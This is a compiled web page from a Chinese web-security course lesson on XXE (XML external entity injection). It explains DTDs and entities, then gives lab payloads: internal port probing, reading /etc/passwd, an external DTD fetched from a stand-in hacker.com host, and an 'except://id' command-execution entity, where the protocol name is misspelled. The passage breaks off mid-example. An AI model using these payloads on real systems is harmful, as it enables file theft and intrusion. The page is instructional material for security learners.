import{_ as o,j as e,o as t,g as c,k as l,h as s,Q as p,s as a}from"./chunks/framework.4e7d56ce.js";const S=JSON.parse('{"title":"XXE：XML 外部实体注入 ","description":"","frontmatter":{},"headers":[],"relativePath":"posts/backEnd/Web 安全攻防之道_文档/(5979) 11  XXE 漏洞：XML 解析器的坑.md","filePath":"posts/backEnd/Web 安全攻防之道_文档/(5979) 11  XXE 漏洞：XML 解析器的坑.md","lastUpdated":1696417798000}'),r={name:"posts/backEnd/Web 安全攻防之道_文档/(5979) 11  XXE 漏洞：XML 解析器的坑.md"},E=p(`<p>上一讲我们介绍了 SSRF 漏洞，一种专门针对服务端的请求伪造攻击，常被用于攻击内网。在里面我介绍了 Burp Collaborator 用于专门测试无回显漏洞的功能，在本讲的 XXE 漏洞测试中，我们依然可以使用，不知道你是否还记得怎么使用？</p><p>下面，我们就开始今天的课程，一场关于 XML 外部实体注入（XXE）漏洞的攻防之路。</p><h3 id="xxe-xml-外部实体注入" tabindex="-1">XXE：XML 外部实体注入 <a class="header-anchor" href="#xxe-xml-外部实体注入" aria-label="Permalink to &quot;XXE：XML 外部实体注入&quot;">​</a></h3><p>XXE（XML External Entity，XML 外部实体注入）正是当允许引用外部实体时，通过构造恶意内容，导致读取任意文件、执行系统命令、内网探测与攻击等危害的一类漏洞。</p><blockquote><p>是不是想到了上节课讲的 SSRF？没错，利用 XXE 可以造成 SSRF。</p></blockquote><p>PHP 默认使用 libxml 来解析 XML，但是从 libxml 2.9.0 开始，它默认不再解析外部实体，导致 PHP 下的 XXE 漏洞已经逐渐消失，除非你指定 LIBLXML_NOENT 去开启外部实体解析，才会存在 XXE 漏洞。</p><div class="language-php vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">php</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#79B8FF;">simplexml_load_string</span><span style="color:#E1E4E8;">($xml, </span><span style="color:#9ECBFF;">&#39;SimpleXMLElement&#39;</span><span style="color:#E1E4E8;">, </span><span style="color:#79B8FF;">LIBXML_NOENT</span><span style="color:#E1E4E8;">);</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#005CC5;">simplexml_load_string</span><span style="color:#24292E;">($xml, </span><span style="color:#032F62;">&#39;SimpleXMLElement&#39;</span><span style="color:#24292E;">, </span><span style="color:#005CC5;">LIBXML_NOENT</span><span style="color:#24292E;">);</span></span></code></pre></div><p>本文也不打算再讲 PHP 环境下的 XXE 漏洞，Java 才是 XXE 漏洞最常见的语言，因此主要以 Java 为例做一些介绍。但在漏洞利用的实例演示上，我依然用 Pikachu 靶场的 XXE 题目（PHP），因为 XXE 在利用上与语言无关，无论是 php、java 还是 C、python，利用技巧都是一样的。</p><h3 id="那么-什么是-xml" tabindex="-1">那么，什么是 XML？ <a class="header-anchor" href="#那么-什么是-xml" aria-label="Permalink to &quot;那么，什么是 XML？&quot;">​</a></h3><p>XML（Extensible Markup Language）意为可扩展性标记语言，我将介绍下 XML 的一些基础知识，方便你更好地理解漏洞原理。</p><h4 id="_1-xml-文档结构" tabindex="-1">1.XML 文档结构 <a class="header-anchor" href="#_1-xml-文档结构" aria-label="Permalink to &quot;1.XML 文档结构&quot;">​</a></h4><p>XML 文档结构包括 XML 声明、文档类型定义（DTD）、文档元素，具体可以参考以下示例。</p><div class="language-xml vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">xml</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#6A737D;">&lt;!--XML声明--&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">&lt;?</span><span style="color:#85E89D;">xml</span><span style="color:#B392F0;"> version</span><span style="color:#E1E4E8;">=</span><span style="color:#9ECBFF;">&quot;1.0&quot;</span><span style="color:#E1E4E8;">?&gt; </span></span>
<span class="line"><span style="color:#6A737D;">&lt;!--文档类型定义--&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">&lt;!</span><span style="color:#F97583;">DOCTYPE</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">people</span><span style="color:#E1E4E8;"> [  </span><span style="color:#6A737D;">&lt;!--定义此文档是 people 类型的文档--&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">  &lt;!ELEMENT people (name,age,mail)&gt;  </span><span style="color:#6A737D;">&lt;!--定义people元素有3个元素--&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">  &lt;!ELEMENT name (#PCDATA)&gt;     </span><span style="color:#6A737D;">&lt;!--定义name元素为&quot;#PCDATA&quot;类型--&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">  &lt;!ELEMENT age (#PCDATA)&gt;   </span><span style="color:#6A737D;">&lt;!--定义age元素为&quot;#PCDATA&quot;类型--&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">  &lt;!ELEMENT mail (#PCDATA)&gt;   </span><span style="color:#6A737D;">&lt;!--定义mail元素为&quot;#PCDATA&quot;类型--&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">]]]&gt;</span></span>
<span class="line"><span style="color:#6A737D;">&lt;!--文档元素--&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">&lt;</span><span style="color:#85E89D;">people</span><span style="color:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">  &lt;</span><span style="color:#85E89D;">name</span><span style="color:#E1E4E8;">&gt;john&lt;/</span><span style="color:#85E89D;">name</span><span style="color:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">  &lt;</span><span style="color:#85E89D;">age</span><span style="color:#E1E4E8;">&gt;18&lt;/</span><span style="color:#85E89D;">age</span><span style="color:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">  &lt;</span><span style="color:#85E89D;">mail</span><span style="color:#E1E4E8;">&gt;john@qq.com&lt;/</span><span style="color:#85E89D;">mail</span><span style="color:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">&lt;/</span><span style="color:#85E89D;">people</span><span style="color:#E1E4E8;">&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#6A737D;">&lt;!--XML声明--&gt;</span></span>
<span class="line"><span style="color:#24292E;">&lt;?</span><span style="color:#22863A;">xml</span><span style="color:#6F42C1;"> version</span><span style="color:#24292E;">=</span><span style="color:#032F62;">&quot;1.0&quot;</span><span style="color:#24292E;">?&gt; </span></span>
<span class="line"><span style="color:#6A737D;">&lt;!--文档类型定义--&gt;</span></span>
<span class="line"><span style="color:#24292E;">&lt;!</span><span style="color:#D73A49;">DOCTYPE</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">people</span><span style="color:#24292E;"> [  </span><span style="color:#6A737D;">&lt;!--定义此文档是 people 类型的文档--&gt;</span></span>
<span class="line"><span style="color:#24292E;">  &lt;!ELEMENT people (name,age,mail)&gt;  </span><span style="color:#6A737D;">&lt;!--定义people元素有3个元素--&gt;</span></span>
<span class="line"><span style="color:#24292E;">  &lt;!ELEMENT name (#PCDATA)&gt;     </span><span style="color:#6A737D;">&lt;!--定义name元素为&quot;#PCDATA&quot;类型--&gt;</span></span>
<span class="line"><span style="color:#24292E;">  &lt;!ELEMENT age (#PCDATA)&gt;   </span><span style="color:#6A737D;">&lt;!--定义age元素为&quot;#PCDATA&quot;类型--&gt;</span></span>
<span class="line"><span style="color:#24292E;">  &lt;!ELEMENT mail (#PCDATA)&gt;   </span><span style="color:#6A737D;">&lt;!--定义mail元素为&quot;#PCDATA&quot;类型--&gt;</span></span>
<span class="line"><span style="color:#24292E;">]]]&gt;</span></span>
<span class="line"><span style="color:#6A737D;">&lt;!--文档元素--&gt;</span></span>
<span class="line"><span style="color:#24292E;">&lt;</span><span style="color:#22863A;">people</span><span style="color:#24292E;">&gt;</span></span>
<span class="line"><span style="color:#24292E;">  &lt;</span><span style="color:#22863A;">name</span><span style="color:#24292E;">&gt;john&lt;/</span><span style="color:#22863A;">name</span><span style="color:#24292E;">&gt;</span></span>
<span class="line"><span style="color:#24292E;">  &lt;</span><span style="color:#22863A;">age</span><span style="color:#24292E;">&gt;18&lt;/</span><span style="color:#22863A;">age</span><span style="color:#24292E;">&gt;</span></span>
<span class="line"><span style="color:#24292E;">  &lt;</span><span style="color:#22863A;">mail</span><span style="color:#24292E;">&gt;john@qq.com&lt;/</span><span style="color:#22863A;">mail</span><span style="color:#24292E;">&gt;</span></span>
<span class="line"><span style="color:#24292E;">&lt;/</span><span style="color:#22863A;">people</span><span style="color:#24292E;">&gt;</span></span></code></pre></div><p>三者其中，与 XXE 漏洞相关的主要在于文档类型定义（DTD），所以下面主要重点来介绍下 DTD。</p><h4 id="_2-dtd-实体声明" tabindex="-1">2.DTD 实体声明 <a class="header-anchor" href="#_2-dtd-实体声明" aria-label="Permalink to &quot;2.DTD 实体声明&quot;">​</a></h4><p>DTD（Document Type Definition，文档类型定义）用于定义 XML 文档结构，包括元素的定义规则、元素间的关系规则、属性的定义规则，其定义结构如下：</p><div class="language-xml vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">xml</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">&lt;!DOCTYPE 根元素 [定义内容]&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">&lt;!DOCTYPE 根元素 [定义内容]&gt;</span></span></code></pre></div><p>DTD 实体就是变量，它既可以在文档内部声明，也可以外部引用，供在 XML 文档里面去使用。</p><ul><li><strong>内部实体声明</strong></li></ul><p>内部声明采用如下格式定义：</p><div class="language-xml vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">xml</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">  &lt;!ENTITY 实体名 &quot;实体值&quot;&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">  &lt;!ENTITY 实体名 &quot;实体值&quot;&gt;</span></span></code></pre></div><p>声明之后就可以通过&quot;&amp;实体名;&quot;来获取，示例如下：</p><div class="language-xml vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">xml</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">  &lt;!</span><span style="color:#F97583;">DOCTYPE</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">foo</span><span style="color:#E1E4E8;"> [</span></span>
<span class="line"><span style="color:#E1E4E8;">    &lt;!</span><span style="color:#F97583;">ENTITY</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">test</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;john&quot;</span><span style="color:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">  ]&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">  &lt;</span><span style="color:#85E89D;">root</span><span style="color:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">    &lt;</span><span style="color:#85E89D;">name</span><span style="color:#E1E4E8;">&gt;</span><span style="color:#79B8FF;">&amp;test;</span><span style="color:#E1E4E8;">&lt;/</span><span style="color:#85E89D;">name</span><span style="color:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">  &lt;/</span><span style="color:#85E89D;">root</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">  &lt;!</span><span style="color:#D73A49;">DOCTYPE</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">foo</span><span style="color:#24292E;"> [</span></span>
<span class="line"><span style="color:#24292E;">    &lt;!</span><span style="color:#D73A49;">ENTITY</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">test</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;john&quot;</span><span style="color:#24292E;">&gt;</span></span>
<span class="line"><span style="color:#24292E;">  ]&gt;</span></span>
<span class="line"><span style="color:#24292E;">  &lt;</span><span style="color:#22863A;">root</span><span style="color:#24292E;">&gt;</span></span>
<span class="line"><span style="color:#24292E;">    &lt;</span><span style="color:#22863A;">name</span><span style="color:#24292E;">&gt;</span><span style="color:#005CC5;">&amp;test;</span><span style="color:#24292E;">&lt;/</span><span style="color:#22863A;">name</span><span style="color:#24292E;">&gt;</span></span>
<span class="line"><span style="color:#24292E;">  &lt;/</span><span style="color:#22863A;">root</span></span></code></pre></div><ul><li><strong>外部实体引用</strong></li></ul><p>XXE 的产生正是外部实体引用的结果，可分为普通实体和参数实体。</p><p><strong>（1）普通实体</strong>声明格式如下：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">&lt;!</span><span style="color:#E1E4E8;">ENTITY 实体名 SYSTEM </span><span style="color:#9ECBFF;">&quot;URI&quot;</span><span style="color:#F97583;">&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">或者</span></span>
<span class="line"><span style="color:#F97583;">&lt;!</span><span style="color:#E1E4E8;">ENTITY 实体名 PUBLIC </span><span style="color:#9ECBFF;">&quot;public_ID&quot;</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;URI&quot;</span><span style="color:#F97583;">&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">&lt;!</span><span style="color:#24292E;">ENTITY 实体名 SYSTEM </span><span style="color:#032F62;">&quot;URI&quot;</span><span style="color:#D73A49;">&gt;</span></span>
<span class="line"><span style="color:#24292E;">或者</span></span>
<span class="line"><span style="color:#D73A49;">&lt;!</span><span style="color:#24292E;">ENTITY 实体名 PUBLIC </span><span style="color:#032F62;">&quot;public_ID&quot;</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;URI&quot;</span><span style="color:#D73A49;">&gt;</span></span></code></pre></div><p>举个例子：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">&lt;!</span><span style="color:#E1E4E8;">DOCTYPE foo [</span><span style="color:#F97583;">&lt;!</span><span style="color:#E1E4E8;">ELEMENT foo ANY</span><span style="color:#F97583;">&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">&lt;!</span><span style="color:#E1E4E8;">ENTITY xxe SYSTEM </span><span style="color:#9ECBFF;">&quot;file:///etc/passwd&quot;</span><span style="color:#F97583;">&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">]</span><span style="color:#F97583;">&gt;</span></span>
<span class="line"><span style="color:#F97583;">&lt;</span><span style="color:#E1E4E8;">foo</span><span style="color:#F97583;">&gt;&amp;</span><span style="color:#E1E4E8;">xxe;</span><span style="color:#F97583;">&lt;/</span><span style="color:#E1E4E8;">foo</span><span style="color:#F97583;">&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">&lt;!</span><span style="color:#24292E;">DOCTYPE foo [</span><span style="color:#D73A49;">&lt;!</span><span style="color:#24292E;">ELEMENT foo ANY</span><span style="color:#D73A49;">&gt;</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">&lt;!</span><span style="color:#24292E;">ENTITY xxe SYSTEM </span><span style="color:#032F62;">&quot;file:///etc/passwd&quot;</span><span style="color:#D73A49;">&gt;</span></span>
<span class="line"><span style="color:#24292E;">]</span><span style="color:#D73A49;">&gt;</span></span>
<span class="line"><span style="color:#D73A49;">&lt;</span><span style="color:#24292E;">foo</span><span style="color:#D73A49;">&gt;&amp;</span><span style="color:#24292E;">xxe;</span><span style="color:#D73A49;">&lt;/</span><span style="color:#24292E;">foo</span><span style="color:#D73A49;">&gt;</span></span></code></pre></div><p>声明实体 xxe，用于读取 /etc/passwd 文件，然后通过 &amp;xxe; 来引用执行。</p><p><strong>（2）参数实体</strong>声明主要用于后续使用，与普通实体不同的是，它中间有百分号字符（%），其声明格式如下：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">&lt;!</span><span style="color:#E1E4E8;">ENTITY </span><span style="color:#F97583;">%</span><span style="color:#E1E4E8;"> 实体名称 </span><span style="color:#9ECBFF;">&quot;实体的值&quot;</span><span style="color:#F97583;">&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">或者</span></span>
<span class="line"><span style="color:#F97583;">&lt;!</span><span style="color:#E1E4E8;">ENTITY </span><span style="color:#F97583;">%</span><span style="color:#E1E4E8;"> 实体名称 SYSTEM </span><span style="color:#9ECBFF;">&quot;URI&quot;</span><span style="color:#F97583;">&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">&lt;!</span><span style="color:#24292E;">ENTITY </span><span style="color:#D73A49;">%</span><span style="color:#24292E;"> 实体名称 </span><span style="color:#032F62;">&quot;实体的值&quot;</span><span style="color:#D73A49;">&gt;</span></span>
<span class="line"><span style="color:#24292E;">或者</span></span>
<span class="line"><span style="color:#D73A49;">&lt;!</span><span style="color:#24292E;">ENTITY </span><span style="color:#D73A49;">%</span><span style="color:#24292E;"> 实体名称 SYSTEM </span><span style="color:#032F62;">&quot;URI&quot;</span><span style="color:#D73A49;">&gt;</span></span></code></pre></div><p>举个例子：</p><div class="language-xml vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">xml</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">&lt;!</span><span style="color:#F97583;">DOCTYPE</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">foo</span><span style="color:#E1E4E8;"> [</span></span>
<span class="line"><span style="color:#E1E4E8;">  	&lt;!</span><span style="color:#F97583;">ENTITY</span><span style="color:#E1E4E8;">  % </span><span style="color:#79B8FF;">xxe</span><span style="color:#F97583;"> SYSTEM </span><span style="color:#9ECBFF;">&quot;http://hacker.com/evil.dtd&quot;</span><span style="color:#E1E4E8;"> &gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">  	</span><span style="color:#79B8FF;">%xxe;</span></span>
<span class="line"><span style="color:#E1E4E8;">]&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">&lt;</span><span style="color:#85E89D;">root</span><span style="color:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">  	&lt;</span><span style="color:#85E89D;">name</span><span style="color:#E1E4E8;">&gt;</span><span style="color:#79B8FF;">&amp;evil;</span><span style="color:#E1E4E8;">&lt;/</span><span style="color:#85E89D;">name</span><span style="color:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">&lt;/</span><span style="color:#85E89D;">root</span><span style="color:#E1E4E8;">&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">&lt;!</span><span style="color:#D73A49;">DOCTYPE</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">foo</span><span style="color:#24292E;"> [</span></span>
<span class="line"><span style="color:#24292E;">  	&lt;!</span><span style="color:#D73A49;">ENTITY</span><span style="color:#24292E;">  % </span><span style="color:#005CC5;">xxe</span><span style="color:#D73A49;"> SYSTEM </span><span style="color:#032F62;">&quot;http://hacker.com/evil.dtd&quot;</span><span style="color:#24292E;"> &gt;</span></span>
<span class="line"><span style="color:#24292E;">  	</span><span style="color:#005CC5;">%xxe;</span></span>
<span class="line"><span style="color:#24292E;">]&gt;</span></span>
<span class="line"><span style="color:#24292E;">&lt;</span><span style="color:#22863A;">root</span><span style="color:#24292E;">&gt;</span></span>
<span class="line"><span style="color:#24292E;">  	&lt;</span><span style="color:#22863A;">name</span><span style="color:#24292E;">&gt;</span><span style="color:#005CC5;">&amp;evil;</span><span style="color:#24292E;">&lt;/</span><span style="color:#22863A;">name</span><span style="color:#24292E;">&gt;</span></span>
<span class="line"><span style="color:#24292E;">&lt;/</span><span style="color:#22863A;">root</span><span style="color:#24292E;">&gt;</span></span></code></pre></div><p>xxe.dtd 内容如下：</p><div class="language-xml vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">xml</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">&lt;!ENTITY evil SYSTEM &quot;file:///etc/passwd&quot;&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">&lt;!ENTITY evil SYSTEM &quot;file:///etc/passwd&quot;&gt;</span></span></code></pre></div><p>上面先声明 xxe 参数实体，引入外部实体 &quot;<a href="http://hacker.com/evil.dtd" target="_blank" rel="noreferrer">http://hacker.com/evil.dtd</a>&quot;，里面声明了一个叫 evil 的实体，用于读取 /etc/passwd 文件，最后在通过 &amp;evil; 来引用执行。</p><p>在不同的语言中其支持协议还不一样，需要根据业务场景来实测，常见的协议有 file、http、ftp、https、except 等等。</p><h3 id="危害-xxe-的常见攻击手段" tabindex="-1">危害：XXE 的常见攻击手段 <a class="header-anchor" href="#危害-xxe-的常见攻击手段" aria-label="Permalink to &quot;危害：XXE 的常见攻击手段&quot;">​</a></h3><p>下面介绍一些 XXE 漏洞的常见利用方法，并提供一些 payload 测试用例，测试仍以 Pikachu XXE 题目作为演示。</p><h4 id="_1-内网攻击" tabindex="-1">1.内网攻击 <a class="header-anchor" href="#_1-内网攻击" aria-label="Permalink to &quot;1.内网攻击&quot;">​</a></h4><p>XXE 支持 http 等 URL，所以同样可以产生与 SSRF 一样效果，对内网进行指纹探测、端口扫描、漏洞攻击等行为。</p><p>比如以下的 payload：</p><div class="language-xml vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">xml</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">&lt;?</span><span style="color:#85E89D;">xml</span><span style="color:#B392F0;"> version</span><span style="color:#E1E4E8;"> = </span><span style="color:#9ECBFF;">&quot;1.0&quot;</span><span style="color:#E1E4E8;">?&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">&lt;!</span><span style="color:#F97583;">DOCTYPE</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">ANY</span><span style="color:#E1E4E8;"> [</span></span>
<span class="line"><span style="color:#E1E4E8;">    &lt;!</span><span style="color:#F97583;">ENTITY</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">xxe</span><span style="color:#F97583;"> SYSTEM </span><span style="color:#9ECBFF;">&quot;http://192.168.31.124:4444/test&quot;</span><span style="color:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">]&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">&lt;</span><span style="color:#85E89D;">x</span><span style="color:#E1E4E8;">&gt;</span><span style="color:#79B8FF;">&amp;xxe;</span><span style="color:#E1E4E8;">&lt;/</span><span style="color:#85E89D;">x</span><span style="color:#E1E4E8;">&gt;&lt;/</span><span style="color:#85E89D;">r</span><span style="color:#E1E4E8;">&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">&lt;?</span><span style="color:#22863A;">xml</span><span style="color:#6F42C1;"> version</span><span style="color:#24292E;"> = </span><span style="color:#032F62;">&quot;1.0&quot;</span><span style="color:#24292E;">?&gt;</span></span>
<span class="line"><span style="color:#24292E;">&lt;!</span><span style="color:#D73A49;">DOCTYPE</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">ANY</span><span style="color:#24292E;"> [</span></span>
<span class="line"><span style="color:#24292E;">    &lt;!</span><span style="color:#D73A49;">ENTITY</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">xxe</span><span style="color:#D73A49;"> SYSTEM </span><span style="color:#032F62;">&quot;http://192.168.31.124:4444/test&quot;</span><span style="color:#24292E;">&gt;</span></span>
<span class="line"><span style="color:#24292E;">]&gt;</span></span>
<span class="line"><span style="color:#24292E;">&lt;</span><span style="color:#22863A;">x</span><span style="color:#24292E;">&gt;</span><span style="color:#005CC5;">&amp;xxe;</span><span style="color:#24292E;">&lt;/</span><span style="color:#22863A;">x</span><span style="color:#24292E;">&gt;&lt;/</span><span style="color:#22863A;">r</span><span style="color:#24292E;">&gt;</span></span></code></pre></div><p>由于不存在该端口，所以会出错误：</p>`,45),y=a("p",null,"图 1 探测内网端口失败",-1),i=a("p",null,"成功的话，会返回空白，通过这种对比差异，可以判断是否利用成功：",-1),d=p(`<p>图 2 探测内网端口成功</p><h4 id="_2-读取本地文件" tabindex="-1">2.读取本地文件 <a class="header-anchor" href="#_2-读取本地文件" aria-label="Permalink to &quot;2.读取本地文件&quot;">​</a></h4><p>通过 file:// 可以读取本地文件，造成敏感文件泄露：</p><div class="language-xml vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">xml</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">&lt;?</span><span style="color:#85E89D;">xml</span><span style="color:#B392F0;"> version</span><span style="color:#E1E4E8;"> = </span><span style="color:#9ECBFF;">&quot;1.0&quot;</span><span style="color:#E1E4E8;">?&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">&lt;!</span><span style="color:#F97583;">DOCTYPE</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">ANY</span><span style="color:#E1E4E8;"> [</span></span>
<span class="line"><span style="color:#E1E4E8;">    &lt;!</span><span style="color:#F97583;">ENTITY</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">xxe</span><span style="color:#F97583;"> SYSTEM </span><span style="color:#9ECBFF;">&quot;file:///etc/passwd&quot;</span><span style="color:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">]&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">&lt;</span><span style="color:#85E89D;">x</span><span style="color:#E1E4E8;">&gt;</span><span style="color:#79B8FF;">&amp;xxe;</span><span style="color:#E1E4E8;">&lt;/</span><span style="color:#85E89D;">x</span><span style="color:#E1E4E8;">&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">&lt;?</span><span style="color:#22863A;">xml</span><span style="color:#6F42C1;"> version</span><span style="color:#24292E;"> = </span><span style="color:#032F62;">&quot;1.0&quot;</span><span style="color:#24292E;">?&gt;</span></span>
<span class="line"><span style="color:#24292E;">&lt;!</span><span style="color:#D73A49;">DOCTYPE</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">ANY</span><span style="color:#24292E;"> [</span></span>
<span class="line"><span style="color:#24292E;">    &lt;!</span><span style="color:#D73A49;">ENTITY</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">xxe</span><span style="color:#D73A49;"> SYSTEM </span><span style="color:#032F62;">&quot;file:///etc/passwd&quot;</span><span style="color:#24292E;">&gt;</span></span>
<span class="line"><span style="color:#24292E;">]&gt;</span></span>
<span class="line"><span style="color:#24292E;">&lt;</span><span style="color:#22863A;">x</span><span style="color:#24292E;">&gt;</span><span style="color:#005CC5;">&amp;xxe;</span><span style="color:#24292E;">&lt;/</span><span style="color:#22863A;">x</span><span style="color:#24292E;">&gt;</span></span></code></pre></div><p>输入上述 XML 提交后，成功读取到 /etc/passwd 文件内容：</p>`,5),g=p(`<p>图 3 利用XXE漏洞读取 /etc/passwd</p><h4 id="_3-远程执行命令" tabindex="-1">3.远程执行命令 <a class="header-anchor" href="#_3-远程执行命令" aria-label="Permalink to &quot;3.远程执行命令&quot;">​</a></h4><p>如果是 PHP 环境下并安装 except 扩展，就可以利用它执行系统命令了。这种情况现在已经比较少见了，更多还是要利用其他漏洞来实现命令或代码执行。</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">&lt;?</span><span style="color:#E1E4E8;">xml version </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;1.0&quot;</span><span style="color:#F97583;">?&gt;</span></span>
<span class="line"><span style="color:#F97583;">&lt;!</span><span style="color:#E1E4E8;">DOCTYPE </span><span style="color:#F97583;">ANY</span><span style="color:#E1E4E8;"> [</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">&lt;!</span><span style="color:#E1E4E8;">ENTITY xxe SYSTEM </span><span style="color:#9ECBFF;">&quot;except://id&quot;</span><span style="color:#F97583;">&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">]</span><span style="color:#F97583;">&gt;</span></span>
<span class="line"><span style="color:#F97583;">&lt;</span><span style="color:#E1E4E8;">x</span><span style="color:#F97583;">&gt;&amp;</span><span style="color:#E1E4E8;">xxe;</span><span style="color:#F97583;">&lt;/</span><span style="color:#E1E4E8;">x</span><span style="color:#F97583;">&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">&lt;?</span><span style="color:#24292E;">xml version </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;1.0&quot;</span><span style="color:#D73A49;">?&gt;</span></span>
<span class="line"><span style="color:#D73A49;">&lt;!</span><span style="color:#24292E;">DOCTYPE </span><span style="color:#D73A49;">ANY</span><span style="color:#24292E;"> [</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">&lt;!</span><span style="color:#24292E;">ENTITY xxe SYSTEM </span><span style="color:#032F62;">&quot;except://id&quot;</span><span style="color:#D73A49;">&gt;</span></span>
<span class="line"><span style="color:#24292E;">]</span><span style="color:#D73A49;">&gt;</span></span>
